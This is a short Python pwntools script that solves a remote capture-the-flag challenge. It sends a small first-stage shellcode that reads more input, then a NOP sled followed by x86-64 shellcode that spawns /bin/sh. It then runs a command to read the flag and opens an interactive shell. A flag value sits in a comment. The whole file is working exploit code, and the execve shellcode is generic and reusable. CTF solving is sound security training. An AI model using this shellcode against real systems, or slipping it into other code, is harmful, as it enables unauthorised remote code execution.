#!/usr/bin/env python
from pwn import *

# AD{She11c0d1ng_1s_funnnnnnnnnn}

host , port = 'ctf.yuawn.idv.tw' , 10104
y = remote( host , port )


sc = '1\xff\xbe\x70\x10`\x00\xba\x00\x01\x00\x001\xc0\x0f\x05'

print len( sc )

y.send( sc )

y.send( '\x90' * 0x20 + 'H1\xf6H1\xd2H\xb8/bin/sh\x00PH\x89\xe7j;X\x0f\x05' )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()